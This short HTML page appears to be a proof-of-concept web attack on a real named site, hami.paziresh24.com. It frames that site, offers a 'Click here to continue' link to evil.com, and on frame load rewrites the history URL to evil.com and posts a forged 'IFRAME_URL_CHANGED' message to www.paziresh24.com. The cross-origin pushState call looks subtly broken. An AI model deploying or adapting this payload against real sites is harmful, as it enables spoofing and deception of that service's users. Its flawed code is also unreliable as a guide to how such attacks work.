<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
</head>
<body>
    <a href="https://evil.com" target="_blank">Click here to continue</a>
    <iframe src="https://hami.paziresh24.com" width="100%" height="500"></iframe>
    <script>
        const iframe = document.querySelector('iframe');
        iframe.onload = function () {
            history.pushState({}, '', 'https://evil.com');
            window.parent.postMessage({
                type: 'IFRAME_URL_CHANGED',
                url: window.location.href
            }, 'https://www.paziresh24.com');
        };
    </script>
</body>
</html>
